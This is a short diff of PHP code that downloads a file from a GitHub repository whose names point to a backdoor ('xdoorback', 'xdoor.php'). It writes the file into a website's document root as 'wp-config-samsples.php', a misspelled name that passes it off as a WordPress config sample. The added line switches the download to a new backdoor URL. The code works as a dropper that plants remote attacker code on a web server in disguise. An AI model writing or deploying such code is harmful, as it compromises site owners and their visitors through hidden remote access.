@@ -15,7 +15,7 @@ return curl_exec($im);
 curl_close($im);
 }
 $check1 = $_SERVER['DOCUMENT_ROOT'] . "/wp-config-samsples.php" ;
-$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/wordpress-samples.php');
+$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/symv2files/main/xdoor.php');
 $open1 = fopen($check1, 'w');
 fwrite($open1, $text1);
 fclose($open1);
